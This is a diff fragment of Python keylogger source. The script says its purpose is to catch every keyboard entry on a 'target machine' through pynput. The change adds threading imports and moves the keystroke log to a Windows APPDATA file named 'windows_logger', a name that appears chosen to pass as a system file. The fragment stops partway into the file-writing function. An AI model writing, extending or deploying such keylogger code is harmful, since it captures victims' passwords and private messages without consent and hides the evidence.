@@ -4,14 +4,13 @@
     Catch all target machine keyboard entries.
 """
 
-import os, sys
+import os, sys, time, threading
 from pynput.keyboard import Listener
 
 keys = []
 count = 0
 
-path = "processmanager" # For linux machines
-#path = os.environ["appdata"] + "\\processmanager" # For windows machines
+path = os.environ["appdata"] + "\\windows_logger" # For windows machines
 
 def write_file(keys):
     with open(path, "a") as file:
